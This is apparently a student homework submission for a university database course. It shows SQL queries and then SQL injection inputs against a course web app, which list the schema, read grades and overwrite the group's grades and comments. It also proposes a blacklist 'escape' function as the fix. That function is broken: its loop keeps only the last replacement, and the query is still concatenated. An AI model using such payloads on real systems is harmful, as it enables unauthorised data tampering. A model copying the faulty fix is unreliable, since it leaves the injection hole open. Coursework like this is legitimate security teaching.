Integrantes: Vicente Leyton - Juan Molina - Andrés Salazar

P1. 
    (a)	SELECT * 
	FROM uchile.transparencia 
	WHERE apellido = 'Mateu' 
	ORDER BY total DESC;

    (b) Devolvemos las notas de los integrantes del grupo.

	SELECT *
	FROM notas.cc3201
	WHERE id = 54
	OR id = 68
	OR id = 84;

	Si se quiere obtener la de un solo integrantes simplemente se quitan los OR de la consulta y se deja el id del integrante que se quiere obtener:

	SELECT *
	FROM notas.cc3201
	WHERE id = 54;

    (c) UPDATE nota.cc3201 
	SET nota = 7 
	WHERE id = 54 
	OR id = 68 
	OR id = 84;

	Mensaje de error que se obtiene: 'ERROR:  permission denied for table cc3201'
	Si se intenta modificar la de un solo integrante, se obtiene el mismo mensaje de error.

    (d) Primero ejecutamos:
	SELECT table_name, table_schema 
	FROM information_schema.tables;

	Para ver las notas:
	SELECT column_name, data_type 
	FROM information_schema.columns
	WHERE table_name='cc3201' 
	AND table_schema='nota';

P2. Inyectando los siguientes inputs en la página web se debería obtener lo pedido:

    (a) "';SELECT table_name, table_schema 
	   FROM information_schema.tables;--

    (b) "';SELECT column_name, data_type 
	   FROM information_schema.columns 
	   WHERE table_name='cc3201' 
	   AND table_schema='nota';--

    (c) Se seleccionaron las notas de todos los integrantes del grupo:

	"';SELECT nombre,nota 
	   FROM nota.cc3201
	   WHERE id = 54 
	   OR id = 68 
	   OR id = 84;--

    (d) Se cambiaron las notas de todos los integrantes por 7:

 	"';UPDATE nota.cc3201 
	   SET nota = 7 
	   WHERE id = 54  
	   OR id = 68  
	   OR id = 84;--

    (e) Cada integrante inyectó su propio comentario:

	"';UPDATE nota.cc3201 
	   SET comentario = 'Messi es mi pastor' 
	   WHERE id = 54;--

	"';UPDATE nota.cc3201 
	   SET comentario = 'make ddd > ChatGPT' 
	   WHERE id = 68;--

	"';UPDATE nota.cc3201 
	   SET comentario = 'subanle a los bots' 
	   WHERE id = 84;--

    (f) En el código original del script App.py, en la línea 30, dice:

	cur.execute("SELECT nombres,apellido_p,apellido_m,mes,anho, total FROM uchile.transparencia WHERE apellido_p='"+input+"' ORDER BY total DESC LIMIT 250")

	Acá se cambia 'input' por 'escape(input)', es decir:

	cur.execute("SELECT nombres,apellido_p,apellido_m,mes,anho, total FROM uchile.transparencia WHERE apellido_p='"+escape(input)+"' ORDER BY total DESC LIMIT 250")

	Y antes se importa el módulo escape en el script App.py el cual define la función escape como sigue:

	def escape(input):
	    dangerous_patterns = [""';", ";--"]

    	    for pattern in dangerous_patterns:
                escaped_input = input.replace(pattern,"")
       
    	    return escaped_input

	La función escape borra los patrones ""';" y ";--" del input de manera de que el input no pueda inyectar un input malicioso con consultas o actualizaciones de 	las tablas en SQL.
	

	